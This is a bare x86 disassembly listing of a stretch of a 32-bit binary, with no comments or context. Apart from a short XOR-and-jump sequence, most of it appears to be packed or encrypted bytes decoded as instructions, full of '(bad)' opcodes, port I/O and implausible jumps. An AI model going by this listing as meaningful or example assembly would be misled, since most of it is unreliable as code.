  40d6c0:	add    eax,0x884fea8e
  40d6c5:	sub    BYTE PTR [edx+0xb986f86],dh
  40d6cb:	xor    DWORD PTR [ebp+0x642968c5],ecx
  40d6d1:	icebp  
  40d6d2:	aad    0xc2
  40d6d4:	push   0xa80fbe6d
  40d6d9:	sub    al,BYTE PTR [edi+0x4b0ea86e]
  40d6df:	pop    ss
  40d6e0:	xchg   ebx,eax
  40d6e1:	dec    edx
  40d6e2:	xchg   ebx,eax
  40d6e3:	popf   
  40d6e4:	pop    eax
  40d6e5:	jns    0x40d675
  40d6e7:	cmc    
  40d6e8:	sar    DWORD PTR [edi],1
  40d6ea:	scas   eax,DWORD PTR es:[edi]
  40d6eb:	in     eax,dx
  40d6ec:	pop    ss
  40d6ed:	rol    DWORD PTR [esp+eiz*4],0xc7
  40d6f1:	ss (bad) 
  40d6f3:	imul   esp,DWORD PTR [eax+eax*4-0x11],0x4d8bd133
  40d6fb:	or     BYTE PTR [ebp+0x729d0a8c],cl
  40d701:	xor    al,BYTE PTR [eax]
  40d703:	cmp    ecx,eax
  40d705:	jne    0x40d129
  40d70b:	mov    ebx,esi
  40d70d:	jmp    0x40d717
  40d712:	mov    ebx,0x32729d
  40d717:	mov    eax,DWORD PTR [ebp-0x4]
  40d71a:	xor    eax,0x7510856
  40d71f:	add    eax,ebx
  40d721:	mov    DWORD PTR [ebp-0xc],eax
  40d724:	xor    ebx,ebx
  40d726:	lea    eax,[ebp-0x10]
  40d729:	add    ebx,DWORD PTR [eax]
  40d72b:	jmp    0x40d889
  40d730:	xchg   ebp,eax
  40d731:	pop    es
  40d732:	mov    ds:0xa5aabdfe,eax
  40d737:	cmp    eax,0xb6db83b1
  40d73c:	push   edx
  40d73d:	mov    edx,0x80012985
  40d742:	jle    0x40d7c2
  40d744:	aas    
  40d745:	jg     0x40d7c5
  40d747:	jle    0x40d782
  40d749:	push   ds
  40d74a:	cmp    al,0xa1
  40d74c:	xchg   esp,eax
  40d74d:	es data16 stc 
  40d750:	push   ebx
  40d751:	fadd   DWORD PTR [ebp+0x1bc8e99f]
  40d757:	pop    ds
  40d758:	add    al,0x2d
  40d75a:	(bad)  
  40d75b:	fldcw  WORD PTR [ebp-0x7c023e7a]
  40d761:	adc    eax,0xb01a8d3f
  40d766:	ret    
  40d767:	or     DWORD PTR [eax-0x5dd34591],esi
  40d76d:	pop    esi
  40d76e:	inc    ebx
  40d76f:	push   ss
  40d770:	mov    ds:0x82df324d,al
  40d775:	leave  
  40d776:	loope  0x40d77b
  40d778:	in     al,0x99
  40d77a:	push   edi
  40d77b:	mov    bl,0x27
  40d77d:	sti    
  40d77e:	loopne 0x40d75d
  40d780:	aam    0x5d
  40d782:	sub    al,0x7e
  40d784:	inc    DWORD PTR [ebx+0x5a]
  40d787:	jge    0x40d7c4
  40d789:	jge    0x40d799
  40d78b:	int    0x4f
  40d78d:	mov    ds:0xa395934d,al
  40d792:	dec    esi
  40d793:	cmp    ch,ah
  40d795:	mov    edi,DWORD PTR [ebx+0x63]
  40d798:	sub    bh,BYTE PTR [ebx+0x5b53450e]
  40d79e:	pushf  
  40d79f:	mov    esi,0xc07c670e
  40d7a4:	pop    DWORD PTR [ebx]
  40d7a6:	fnstsw WORD PTR [edx+0x34]
  40d7a9:	push   edi
  40d7aa:	and    esp,ebp
  40d7ac:	push   ebx
  40d7ad:	xor    DWORD PTR [esi+0x6a],esi
  40d7b0:	pop    edx
  40d7b1:	outs   dx,DWORD PTR ds:[esi]
  40d7b2:	lock lods al,BYTE PTR ds:[esi]
  40d7b4:	add    al,0x4c
  40d7b6:	cmp    al,dl
  40d7b8:	sbb    al,BYTE PTR [ecx+eiz*1+0x89d07ac]
  40d7bf:	pop    ecx
  40d7c0:	inc    eax
  40d7c1:	(bad)  
  40d7c2:	call   FWORD PTR [esi-0x25e7a4a1]
  40d7c8:	dec    ebp
  40d7c9:	or     dh,BYTE PTR [edi]
  40d7cb:	dec    ecx
  40d7cc:	adc    eax,0xe5616394
  40d7d1:	mov    cl,al
  40d7d3:	repz test esi,ebx
  40d7d6:	inc    esp
  40d7d7:	mov    ebx,0x1a308c22
  40d7dc:	fld    QWORD PTR [esi]
  40d7de:	dec    ebp
  40d7df:	push   ebp
  40d7e0:	scas   eax,DWORD PTR es:[edi]
  40d7e1:	lods   al,BYTE PTR ds:[esi]
  40d7e2:	lahf   
  40d7e3:	repz jg 0x40d857
  40d7e6:	shr    dh,0xb
  40d7e9:	dec    eax
  40d7ea:	adc    eax,0xb28698f5
  40d7ef:	push   ds
  40d7f0:	inc    edx
  40d7f1:	and    al,0x56
  40d7f3:	out    0x6b,al
  40d7f5:	(bad)  
  40d7f6:	out    dx,eax
  40d7f7:	fdivr  DWORD PTR [edx+0x7d]
  40d7fa:	push   cs
  40d7fb:	cwde   
  40d7fc:	pop    esp
  40d7fd:	lahf   
  40d7fe:	pop    esi
  40d7ff:	(bad)  
  40d800:	cmp    eax,0x2088791c
  40d805:	shl    BYTE PTR [edx],0xa3
  40d808:	rol    DWORD PTR [esi+eax*2-0x28d8e216],cl
  40d80f:	mov    eax,ds:0xa5c0d65d
  40d814:	add    al,0xc2
  40d816:	mov    ds:0x825ec843,al
  40d81b:	sbb    dh,BYTE PTR [edx]
  40d81d:	dec    esi
  40d81e:	mov    esp,edi
  40d820:	je     0x40d89f
  40d822:	cmp    ecx,DWORD PTR [edi+edi*2-0xc489be1]
  40d829:	jbe    0x40d820
  40d82b:	jge    0x40d85c
  40d82d:	aaa    
  40d82e:	aad    0x41
  40d830:	lods   al,BYTE PTR ds:[esi]
  40d831:	sbb    edx,DWORD PTR [ebx+0x52]
  40d834:	lea    ebp,[ecx]
  40d836:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d837:	push   ecx
  40d838:	cwde   
  40d839:	mov    bl,0x7f
  40d83b:	mov    dh,0x77
  40d83d:	xlat   BYTE PTR ds:[ebx]
  40d83e:	and    BYTE PTR [edx-0x3e],0x15
  40d842:	out    0x9,eax
  40d844:	and    eax,0x333c0d83
  40d849:	pusha  
  40d84a:	test   dh,bh
  40d84c:	adc    edi,DWORD PTR [esi]
  40d84e:	(bad)  
  40d84f:	bound  ebp,QWORD PTR [ebp+0x3]
  40d852:	clc    
  40d853:	dec    ebx
  40d854:	inc    esp
  40d855:	sbb    DWORD PTR [edx+eax*8+0x4a],0xffffffb4
  40d85a:	jl     0x40d838
  40d85c:	test   DWORD PTR [ecx],esi
  40d85e:	test   eax,0xc558cb0c
  40d863:	cmp    edi,edx
  40d865:	test   ebx,edi
  40d867:	jle    0x40d8cb
  40d869:	aas    
  40d86a:	(bad)  
  40d86b:	cs ds pop ebx
  40d86e:	sbb    BYTE PTR [ecx+0x75],cl
  40d871:	lods   al,BYTE PTR ds:[esi]
  40d872:	jg     0x40d891
  40d874:	adc    ecx,DWORD PTR [esi+eax*1+0x14d142c8]
  40d87b:	gs inc ebx
  40d87d:	call   0xfe0dad8c
  40d882:	push   edx
  40d883:	test   eax,0xe55e5f25
  40d888:	jecxz  0x40d889
  40d88a:	shl    DWORD PTR [ebx],cl
  40d88c:	fucomi st,st(1)
  40d88e:	pop    ecx
  40d88f:	add    DWORD PTR [eax],eax
  40d891:	add    dh,dh
  40d893:	arpl   WORD PTR [ebp+esi*2+0x7d97c57d],dx
  40d89a:	imul   eax,DWORD PTR [edx],0x51
  40d89d:	mov    edx,DWORD PTR [edx-0x3db7fde1]
  40d8a3:	cmp    DWORD PTR [esi+0x7e],0x7e7e7f3f
  40d8aa:	xchg   ebx,eax
  40d8ab:	ret    0xbc24
  40d8ae:	sub    esp,DWORD PTR [eax+0x4f]
  40d8b1:	clc    
  40d8b2:	xor    ah,al
  40d8b4:	cmc    
  40d8b5:	pop    esp
  40d8b6:	outs   dx,DWORD PTR ds:[esi]
  40d8b7:	push   ecx
  40d8b8:	popf   
  40d8b9:	call   0x1a5ad04b
  40d8be:	shr    BYTE PTR [eax],cl
  40d8c0:	xchg   edx,eax
  40d8c1:	jbe    0x40d86a
  40d8c3:	pop    ebx
  40d8c4:	push   ebp
  40d8c5:	dec    edx
  40d8c6:	test   DWORD PTR ds:0xcea68094,ebx
  40d8cc:	ja     0x40d939
  40d8ce:	push   es
  40d8cf:	cmp    cl,ah
  40d8d1:	adc    BYTE PTR [ecx],dl
  40d8d3:	je     0x40d879
  40d8d5:	jns    0x40d926
  40d8d7:	fwait
  40d8d8:	int    0xba
  40d8da:	es push eax
  40d8dc:	aam    0x90
  40d8de:	test   al,0xf9
  40d8e0:	xchg   edx,eax
  40d8e1:	pop    edx
  40d8e2:	sub    ecx,esp
  40d8e4:	bound  ebp,QWORD PTR [eax-0x36937966]
  40d8ea:	sbb    BYTE PTR [ecx-0x62],0xe1
  40d8ee:	sbb    DWORD PTR [eax+0x3790c77c],eax
  40d8f4:	pushf  
  40d8f5:	cmp    BYTE PTR [edi-0x48],bl
  40d8f8:	mov    al,0x4c
  40d8fa:	ds in  al,0x7f
  40d8fd:	lods   al,BYTE PTR ds:[esi]
  40d8fe:	push   edi
  40d8ff:	les    ebp,FWORD PTR [ecx]
  40d901:	xchg   BYTE PTR [edi+0x3a0dd6c9],cl
  40d907:	mov    ecx,0x4bf2a049
  40d90c:	sbb    DWORD PTR fs:[esi+0x31b6c871],0xf42d04ac
  40d917:	dec    si
  40d919:	or     ebx,DWORD PTR [ebp-0x6bbb94b4]
  40d91f:	stc    
  40d920:	cmp    dl,BYTE PTR [eax-0x7275f5c2]
  40d926:	dec    eax
  40d927:	in     eax,dx
  40d928:	ss (bad) 
  40d92a:	sar    BYTE PTR [eax+0x778bdc6],1
  40d930:	scas   al,BYTE PTR es:[edi]
  40d931:	nop
  40d932:	outs   dx,DWORD PTR ds:[esi]
  40d933:	and    DWORD PTR [ebp+0x13],edi
  40d936:	(bad)  [edx+0x6157237c]
  40d93c:	push   esp
  40d93d:	adc    cl,BYTE PTR [edi+0x73]
  40d940:	inc    ebp
  40d941:	loope  0x40d96f
  40d943:	sub    al,0xc7
  40d945:	in     eax,dx
  40d946:	bound  eax,QWORD PTR [ebp+0x1c]
  40d949:	xchg   esp,eax
  40d94a:	hlt    
  40d94b:	mov    ds:0x4de3a7a7,eax
  40d950:	and    eax,0xf3b0a25b
  40d955:	outs   dx,BYTE PTR ds:[esi]
  40d956:	pop    edx
  40d957:	out    dx,al
  40d958:	out    0x87,al
  40d95a:	aad    0x5c
  40d95c:	out    0x9d,eax
  40d95e:	loop   0x40d93a
  40d960:	sub    dl,BYTE PTR [edx+0x2b8b1a8b]
  40d966:	mov    eax,ds:0xadd8592
  40d96b:	cs push esi
  40d96d:	imul   ebx,edx,0xffffffdb
  40d970:	das    
  40d971:	jge    0x40d92a
  40d973:	test   eax,0xca2c8d9f
  40d978:	out    dx,eax
  40d979:	mov    esp,0x831ae517
  40d97e:	push   edi
  40d97f:	int3   
  40d980:	das    
  40d981:	cmp    dl,ah
  40d983:	out    dx,al
  40d984:	xchg   BYTE PTR [ebx],al
  40d986:	repnz or ebp,esi
  40d989:	(bad)  
  40d98a:	or     al,0x14
  40d98c:	jge    0x40d9af
  40d98e:	xchg   ebp,eax
  40d98f:	scas   eax,DWORD PTR es:[edi]
  40d990:	and    ch,BYTE PTR [eax-0x30e614aa]
  40d996:	xchg   edi,eax
  40d997:	add    edi,DWORD PTR [eax]
  40d999:	lea    esp,[esi+0x74237f4c]
  40d99f:	test   al,0xc0
  40d9a1:	cmp    esp,esp
  40d9a3:	int    0x3e
  40d9a5:	rcl    BYTE PTR [esi+0x72],1
  40d9a8:	stos   BYTE PTR es:[edi],al
  40d9a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9aa:	stos   DWORD PTR es:[edi],eax
  40d9ab:	or     BYTE PTR [ebx+0x70],ch
  40d9ae:	lea    ecx,[esi]
  40d9b0:	das    
  40d9b1:	hlt    
  40d9b2:	push   ebp
  40d9b3:	mov    al,0xef
  40d9b5:	jae    0x40da30
  40d9b7:	jmp    0x794e9951
  40d9bc:	and    ecx,DWORD PTR [edi+0x21903161]
  40d9c2:	pop    esi
  40d9c3:	(bad)
  40d9c6:	lahf   
  40d9c7:	cmp    al,0xde
  40d9c9:	push   0xffffffc7
  40d9cb:	enter  0x2db,0xfd
  40d9cf:	int    0x3
  40d9d1:	dec    ebx
  40d9d2:	lock mov edx,0xf89409d9
  40d9d8:	push   ecx
  40d9d9:	loop   0x40da15
  40d9db:	es aas 
  40d9dd:	adc    al,0x69
  40d9df:	ret    
  40d9e0:	and    eax,ebx
  40d9e2:	sahf   
  40d9e3:	or     al,0x93
  40d9e5:	and    BYTE PTR [edi-0xe0c7c60],bl
  40d9eb:	inc    ebx
  40d9ec:	jmp    0x40db4a
  40d9f1:	jae    0x40d9e7
  40d9f3:	aas    
  40d9f4:	mov    DWORD PTR [ecx-0x6573b2b3],esi
  40d9fa:	cmp    BYTE PTR [edx+0x77],bl
  40d9fd:	jmp    0x8344d362
  40da02:	cmp    BYTE PTR [esi+0x7e],0x3f
  40da06:	jg     0x40da86
  40da08:	jle    0x40d9d9
  40da0a:	pop    edx
  40da0b:	pop    ebp
  40da0c:	inc    ebx
  40da0d:	rcl    BYTE PTR [esi+0x4f],1
  40da10:	or     edx,DWORD PTR ds:0x18fb2b5f
  40da16:	pop    edi
  40da18:	retf   0xb0db
  40da1b:	xchg   esp,eax
  40da1c:	cmc    
  40da1d:	mov    al,0xe1
  40da1f:	sbb    DWORD PTR [edx-0x289285d3],edx
  40da25:	push   es
  40da26:	xor    dl,BYTE PTR [esi]
  40da28:	es inc ebp
  40da2a:	stos   BYTE PTR es:[edi],al
  40da2b:	sbb    BYTE PTR [ebx-0x38635016],0xd3
  40da32:	shl    DWORD PTR [edi],cl
  40da34:	mov    DWORD PTR [esi-0x10],esi
  40da37:	mov    al,0xcb
  40da39:	les    ecx,FWORD PTR [ebx+0x790cadf]
  40da3f:	sub    cl,BYTE PTR [edx]
  40da41:	ret    
  40da42:	push   esi
  40da43:	push   edx
  40da44:	adc    dl,bl
  40da46:	iret   
  40da47:	push   ecx
  40da48:	add    BYTE PTR [edi-0x42dbbb69],ch
  40da4e:	mov    ebp,0xad4093a1
  40da53:	aad    0x26
  40da55:	sbb    dh,BYTE PTR ds:0xe6e78573
  40da5b:	sbb    BYTE PTR [ebp+ebp*4-0x4],0xf9
  40da60:	jo     0x40da62
  40da62:	inc    edx
  40da63:	and    eax,0xca7ae48f
  40da68:	loope  0x40da6c
  40da6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da6b:	push   ecx
  40da6c:	jb     0x40da2c
  40da6e:	add    eax,0x1df9e723
  40da73:	jb     0x40da78
  40da75:	jmp    DWORD PTR [eax+ebp*4-0x61]
  40da79:	loope  0x40da61
  40da7b:	addr16 aad 0xf4
  40da7e:	adc    DWORD PTR [eax+edx*2],edi
  40da81:	inc    ecx
  40da82:	aam    0x68
  40da84:	in     al,dx
  40da85:	rol    DWORD PTR [ebp-0x2d],1
  40da88:	es lea edx,ds:[esi-0x2ead6dde]
  40da90:	ficomp WORD PTR [esi+0x48a739bb]
  40da96:	inc    esp
  40da97:	xchg   BYTE PTR [esp+edi*4-0x2f730619],dl
  40da9e:	xor    ebp,DWORD PTR [ebx+0x27]
  40daa1:	mov    ebx,0x9ff93a7b
  40daa6:	sbb    DWORD PTR [ebx-0x70],0x19
  40daaa:	sub    edx,ebx
  40daac:	sbb    eax,0x4c7cf9db
  40dab1:	ror    DWORD PTR [ecx+0x6380fc71],1
  40dab7:	jmp    0x40dac1
  40dab9:	dec    edi
  40daba:	push   ebp
  40dabb:	pop    ebx
  40dabc:	sbb    BYTE PTR ds:0xd7fc2f80,ah
  40dac2:	bound  ecx,QWORD PTR [eax+edx*1]
  40dac5:	xchg   BYTE PTR [edx],bh
  40dac7:	mov    ds:0x9375d9d9,al
  40dacc:	js     0x40da9d
  40dace:	xchg   BYTE PTR [edx+edx*1],cl
  40dad1:	mov    edi,0x5d77c35f
  40dad6:	rcl    edi,1
  40dad8:	mov    ds:0xa4cf32a4,eax
  40dadd:	sub    dh,BYTE PTR [eax]
  40dadf:	in     eax,dx
  40dae0:	mov    BYTE PTR [ebx-0x74],dh
  40dae3:	enter  0x4839,0xb7
  40dae7:	sahf   
  40dae8:	mov    eax,ds:0xf1b1321a
  40daed:	mov    edi,0x7773612d
  40daf2:	mov    ebp,esp
  40daf4:	int3   
  40daf5:	shl    DWORD PTR [ecx+0x3d2ed2da],1
  40dafb:	int    0x2b
  40dafd:	mov    al,BYTE PTR ds:0xd7712a3c
  40db03:	cmp    al,0xf1
  40db05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db06:	in     al,0x9e
  40db08:	sub    eax,0x905252ee
  40db0d:	or     BYTE PTR [edx-0x6fe6e7e2],bh
  40db13:	xchg   ecx,eax
  40db14:	push   ebp
  40db15:	popf   
  40db16:	or     bl,BYTE PTR [edx-0x4]
  40db19:	push   eax
  40db1a:	inc    edx
  40db1b:	and    DWORD PTR [ecx+0x25c7712b],ecx
  40db21:	lock rcl BYTE PTR [eax],cl
  40db24:	or     ah,BYTE PTR [ebx-0xefb4748]
  40db2a:	mov    edi,0x14526805
  40db2f:	dec    esi
  40db30:	fidivr DWORD PTR [esi]
  40db32:	and    bl,ah
  40db34:	mov    ds,WORD PTR [edi]
  40db36:	inc    ebx
  40db37:	shr    BYTE PTR [esi-0x192c1af9],1
  40db3d:	push   ebp
  40db3e:	outs   dx,BYTE PTR ds:[esi]
  40db3f:	data16 mov bl,0x6
  40db42:	mov    esp,0xa9c7ead5
  40db47:	cmp    dl,BYTE PTR gs:[eax+0x39]
  40db4b:	pop    ebp
  40db4c:	adc    BYTE PTR [edi],cl
  40db4e:	test   BYTE PTR [edx],dh
  40db50:	add    al,0x0
  40db52:	add    cl,ch
  40db54:	pop    ecx
  40db55:	add    DWORD PTR [eax],eax
  40db57:	add    BYTE PTR [ebp-0x54e36178],dl
  40db5d:	cmp    al,0xbd
  40db5f:	mov    ecx,0xd105ab5
  40db64:	push   esi
  40db65:	ja     0x40db80
  40db67:	fs inc esp
  40db69:	cmp    DWORD PTR [esi+0x7e],0x3f
  40db6d:	jg     0x40dbed
  40db6f:	jle    0x40db28
  40db71:	xchg   ebp,eax
  40db72:	in     eax,0xc0
  40db74:	inc    ebx
  40db75:	push   ds
  40db76:	aad    0xa4
  40db78:	scas   al,BYTE PTR es:[edi]
  40db79:	pop    edx
  40db7a:	sahf   
  40db7b:	mov    ch,0x41
  40db7d:	out    0x35,eax
  40db7f:	sahf   
  40db80:	mov    DWORD PTR [esi+0x1b],ecx
  40db83:	or     dl,BYTE PTR [ebp-0x69]
  40db86:	dec    esi
  40db87:	icebp  
  40db88:	push   ebx
  40db89:	dec    eax
  40db8a:	mov    DWORD PTR [esi-0x58a39e25],esi
  40db90:	test   DWORD PTR [edi+ebx*2+0x283a4f60],ebx
  40db97:	inc    esp
  40db98:	xchg   ebp,eax
  40db99:	inc    esi
  40db9a:	lea    esp,[ecx+0x55ff0136]
  40dba0:	fsubr  st(1),st
  40dba2:	adc    eax,0x692d8cae
  40dba7:	pop    ecx
  40dba8:	inc    edi
  40dba9:	mul    DWORD PTR [ecx]
  40dbab:	pop    edx
  40dbac:	test   BYTE PTR [ebp+0x7],bh
  40dbaf:	sub    ecx,eax
  40dbb1:	shr    BYTE PTR [ecx],cl
  40dbb3:	push   esp
  40dbb4:	js     0x40db84
  40dbb6:	push   0xffffff82
  40dbb8:	and    al,0xcd
  40dbba:	or     DWORD PTR [esp+ebx*2-0x6df3a3ab],ecx
  40dbc1:	sub    eax,0x81b1c4a8
  40dbc6:	pop    eax
  40dbc7:	(bad)  
  40dbc8:	outs   dx,DWORD PTR ds:[esi]
  40dbc9:	push   ds
  40dbca:	jo     0x40dbc3
  40dbcc:	mul    DWORD PTR [eax+0x43]
  40dbcf:	(bad)  
  40dbd0:	jg     0x40dc14
  40dbd2:	adc    dl,BYTE PTR [eax-0x28b6310b]
  40dbd8:	shl    BYTE PTR [edx+0xc],cl
  40dbdb:	push   es
  40dbdc:	dec    ebx
  40dbdd:	dec    eax
  40dbde:	retf   0xd769
  40dbe1:	sahf   
  40dbe2:	and    al,0xe9
  40dbe4:	jb     0x40db96
  40dbe6:	shr    DWORD PTR [ebp+0x5a7d3f76],0x4b
  40dbed:	shl    DWORD PTR [esi],0x16
  40dbf0:	daa    
  40dbf1:	and    DWORD PTR [esi+0x44b155ab],edi
  40dbf7:	test   al,0xdd
  40dbf9:	sub    DWORD PTR [esi-0x113f65d9],eax
  40dbff:	add    al,0xdc
  40dc01:	sbb    ecx,ebp
  40dc03:	dec    edx
  40dc04:	aas    
  40dc05:	sub    al,0xd5
  40dc07:	jbe    0x40dc6a
  40dc09:	inc    ebx
  40dc0a:	shl    ecx,0x96
  40dc0d:	aad    0xc2
  40dc0f:	adc    al,0x38
  40dc11:	push   es
  40dc12:	ret    
  40dc13:	push   esi
  40dc14:	into   
  40dc15:	fnstsw WORD PTR [ebp+eiz*2+0x3]
  40dc19:	nop
  40dc1a:	add    esp,DWORD PTR [esi-0x1c]
  40dc1d:	rcr    BYTE PTR [edi+0x10],1
  40dc20:	push   ds
  40dc21:	repz add bl,BYTE PTR [edi+0x2ee1f628]
  40dc28:	aad    0xf0
  40dc2a:	push   0xffffffbd
  40dc2c:	push   esp
  40dc2d:	test   BYTE PTR [edi-0x3235b0ed],ah
  40dc33:	adc    eax,0xf1f314c6
  40dc38:	sub    BYTE PTR [edi],al
  40dc3a:	gs into 
  40dc3c:	jecxz  0x40dc9d
  40dc3e:	inc    ebx
  40dc3f:	les    edi,FWORD PTR [ecx]
  40dc41:	xchg   BYTE PTR [ebx+eax*8-0x1b],ch
  40dc45:	addr16 das 
  40dc47:	add    BYTE PTR [edi+0x52361aea],0x4a
  40dc4e:	pop    esi
  40dc4f:	adc    BYTE PTR [edi],al
  40dc51:	in     ax,dx
  40dc53:	stc    
  40dc54:	xchg   edx,eax
  40dc55:	lds    edx,FWORD PTR [edi-0x49]
  40dc58:	add    ch,BYTE PTR [ecx-0x3a]
  40dc5b:	outs   dx,BYTE PTR ds:[esi]
  40dc5c:	shr    BYTE PTR [edi],1
  40dc5e:	inc    ecx
  40dc5f:	sbb    DWORD PTR [edx],esi
  40dc61:	xor    ah,BYTE PTR [esi+0x16]
  40dc64:	sub    al,0x14
  40dc66:	(bad)  [eax]
  40dc68:	and    DWORD PTR [edx-0x28482a4d],ebp
  40dc6e:	push   cs
  40dc6f:	add    cl,bl
  40dc71:	mov    cl,BYTE PTR [edx]
  40dc73:	cs add ah,ch
  40dc76:	inc    edi
  40dc77:	mov    dl,0xab
  40dc79:	pop    ebx
  40dc7a:	mov    edi,DWORD PTR [esp+eax*2+0x11ab2b96]
  40dc81:	sbb    DWORD PTR [edx],esp
  40dc83:	out    dx,eax
  40dc84:	xchg   esi,eax
  40dc85:	call   0xba20:0xbcca457d
  40dc8c:	shl    DWORD PTR [eax+eax*1],1
  40dc8f:	push   esp
  40dc90:	inc    ebx
  40dc91:	inc    ebp
  40dc92:	add    ecx,esi
  40dc94:	pop    ds
  40dc95:	push   esi
  40dc96:	loop   0x40dc62
  40dc98:	hlt    
  40dc99:	add    BYTE PTR [ecx+eax*1+0x29f60220],al
  40dca0:	loope  0x40dc34
  40dca2:	aaa    
  40dca3:	aam    0x7f
  40dca5:	sti    
  40dca6:	pop    esi
  40dca7:	xchg   esi,eax
  40dca8:	push   0xffffff99
  40dcaa:	mov    BYTE PTR [eax-0x57ee9e5a],bh
  40dcb0:	fst    QWORD PTR [edx+0x159e9]
  40dcb6:	add    BYTE PTR [eax+0x15],cl
  40dcb9:	sti    
  40dcba:	retf   0xdc7b
  40dcbd:	jns    0x40dc54
  40dcbf:	rcl    BYTE PTR ds:0xeffd3fe9,cl
  40dcc5:	cmp    eax,0x7e850572
  40dcca:	jle    0x40dd0b
  40dccc:	jg     0x40dd4c
  40dcce:	jle    0x40dc58
  40dcd0:	push   0x1c87d08f
  40dcd5:	push   edi
  40dcd6:	mov    ds:0xecd7d26f,eax
  40dcdb:	int3   
  40dcdc:	rcl    BYTE PTR [esi+0x22],0x61
  40dce0:	push   0x9725f8c
  40dce5:	cmp    BYTE PTR [edi],0x4e
  40dce8:	jns    0x40dd55
  40dcea:	xchg   ebp,eax
  40dceb:	pop    ecx
  40dcec:	mov    al,0xba
  40dcee:	aas    
  40dcef:	fistp  WORD PTR [ebx]
  40dcf1:	imul   ebx,DWORD PTR [ecx-0x67],0xbcf42180
  40dcf8:	push   0xffffff80
  40dcfa:	scas   eax,DWORD PTR es:[edi]
  40dcfb:	push   edi
  40dcfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcfd:	rsm    
  40dcff:	fistp  DWORD PTR [edi+0x3]
  40dd02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd03:	ror    al,cl
  40dd05:	int    0x3c
  40dd07:	jne    0x40dd56
  40dd09:	scas   eax,DWORD PTR es:[edi]
  40dd0a:	jns    0x40dd23
  40dd0c:	mov    ecx,0x4a800b25
  40dd11:	mov    al,0xb2
  40dd13:	dec    esi
  40dd14:	pop    eax
  40dd15:	out    dx,al
  40dd16:	sbb    ebx,edi
  40dd18:	add    cl,BYTE PTR [ecx]
  40dd1a:	add    dh,cl
  40dd1c:	mov    DWORD PTR [esi+0x0],esp
  40dd1f:	lea    ebp,[edx-0x2ccb63a]
  40dd25:	cld    
  40dd26:	mov    cl,0x8f
  40dd28:	add    ecx,edi
  40dd2a:	mov    eax,ds:0x6831acaf
  40dd2f:	ret    
  40dd30:	xchg   esp,eax
  40dd31:	and    DWORD PTR gs:[ebx],esi
  40dd34:	sub    al,0xe8
  40dd36:	stos   DWORD PTR es:[edi],eax
  40dd37:	data16 ja 0x40dd2f
  40dd3a:	jp     0x40dd7c
  40dd3c:	addr16 cld 
  40dd3e:	jo     0x40dd2b
  40dd40:	ds lock loopne 0x40dd1f
  40dd44:	dec    esp
  40dd45:	js     0x40dd28
  40dd47:	in     eax,dx
  40dd48:	pop    ebx
  40dd49:	addr16 jae 0x40ddc7
  40dd4c:	inc    esp
  40dd4d:	mov    ch,0x39
  40dd4f:	xchg   BYTE PTR ds:0xf50f5a3c,bh
  40dd55:	std    
  40dd56:	into   
  40dd57:	mov    eax,ds:0xbda47b13
  40dd5c:	inc    ecx
  40dd5d:	adc    eax,0xa3836145
  40dd62:	inc    esi
  40dd63:	mov    bl,0x94
  40dd65:	imul   ebx,DWORD PTR [ebx],0x682f5af1
  40dd6b:	mov    edx,0xdbc5ea7c
  40dd70:	jmp    0x40ddbd
  40dd72:	mov    ebp,fs
  40dd74:	add    dh,BYTE PTR [ecx+0x8]
  40dd77:	hlt    
  40dd78:	in     eax,dx
  40dd79:	pop    ss
  40dd7a:	xor    esi,ebx
  40dd7c:	pop    ds
  40dd7d:	in     eax,dx
  40dd7e:	out    0xf5,eax
  40dd80:	xchg   ecx,eax
  40dd81:	or     DWORD PTR [eax-0x1f],0x39a986f4
  40dd88:	and    ch,bl
  40dd8a:	lods   al,BYTE PTR ds:[esi]
  40dd8b:	je     0x40dda5
  40dd8d:	xchg   ecx,eax
  40dd8e:	ins    DWORD PTR es:[edi],dx
  40dd8f:	mov    ch,0xd1
  40dd91:	inc    eax
  40dd92:	mov    esi,0xfea28257
  40dd97:	out    0x52,al
  40dd99:	mov    dl,0x56
  40dd9b:	fmulp  st(1),st
  40dd9d:	cs int3 
  40dd9f:	(bad)  
  40dda0:	mov    DWORD PTR [edi+edi*4-0x2f8c0d24],esi
  40dda7:	mov    ecx,0xdc06a959
  40ddac:	mov    cl,0xfe
  40ddae:	pop    es
  40ddaf:	das    
  40ddb0:	ret    0xd036
  40ddb3:	pushf  
  40ddb4:	mov    dh,0x21
  40ddb6:	dec    eax
  40ddb7:	cmp    eax,eax
  40ddb9:	shl    DWORD PTR [esi+0x5d7ecb54],cl
  40ddbf:	ins    DWORD PTR es:[edi],dx
  40ddc0:	mov    ebp,0x389aff79
  40ddc5:	in     eax,dx
  40ddc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddc7:	mov    cl,0x21
  40ddc9:	sti    
  40ddca:	mov    bl,dl
  40ddcc:	dec    eax
  40ddcd:	mov    ?,WORD PTR [edi-0x50]
  40ddd0:	sti    
  40ddd1:	or     al,0x86
  40ddd3:	das    
  40ddd4:	rcr    DWORD PTR [edx],cl
  40ddd6:	das    
  40ddd7:	push   edx
  40ddd8:	xor    eax,0xf4d3193b
  40dddd:	test   esp,esp
  40dddf:	fwait
  40dde0:	sbb    al,0x85
  40dde2:	push   0x20
  40dde4:	cmp    al,0xa9
  40dde6:	stc    
  40dde7:	pop    es
  40dde8:	adc    al,0xcc
  40ddea:	inc    esi
  40ddeb:	jb     0x40ddc0
  40dded:	stos   BYTE PTR es:[edi],al
  40ddee:	ins    DWORD PTR es:[edi],dx
  40ddef:	hlt    
  40ddf0:	test   DWORD PTR [eax],0xbe04c737
  40ddf6:	ins    BYTE PTR es:[edi],dx
  40ddf7:	ins    BYTE PTR es:[edi],dx
  40ddf8:	test   cl,ah
  40ddfa:	ss cld 
  40ddfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddfd:	pusha  
  40ddfe:	fld    TBYTE PTR [esp+edi*2-0x2d]
  40de02:	mov    eax,ds:0xf47b36c9
  40de07:	btc    edi,edi
  40de0a:	sbb    esi,DWORD PTR [edx-0x35e916d2]
  40de10:	push   0xa
  40de12:	pop    ecx
  40de13:	push   0x4
  40de15:	pop    ebx
  40de16:	inc    ebx
  40de17:	xchg   ebx,ecx
  40de19:	jmp    0x40df77
